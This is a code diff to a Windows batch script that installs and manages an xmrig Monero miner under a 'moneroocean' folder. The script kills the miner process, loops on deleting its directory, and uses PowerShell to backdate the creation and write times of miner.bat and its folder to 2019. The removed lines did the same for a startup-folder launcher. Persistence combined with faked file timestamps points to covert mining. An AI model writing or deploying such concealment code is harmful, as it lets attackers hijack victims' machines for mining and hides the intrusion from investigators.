@@ -194,7 +194,7 @@ taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
 echo [*] Removing "%USERPROFILE%\moneroocean" directory
-timeout 5
+
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0
 
@@ -417,10 +417,6 @@ if errorlevel 1 (
 
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\miner.bat').CreationTime=('3 August 2019 17:00:00')"
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\miner.bat').LastWriteTime=('3 August 2019 17:00:00')"
-
-powershell -Command "(Get-Item '%STARTUP_DIR%\moneroocean_miner.bat').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%STARTUP_DIR%\moneroocean_miner.bat').LastWriteTime=('3 August 2019 17:00:00')"
-
 
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\').CreationTime=('3 August 2019 17:00:00')"
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\').LastWriteTime=('3 August 2019 17:00:00')"
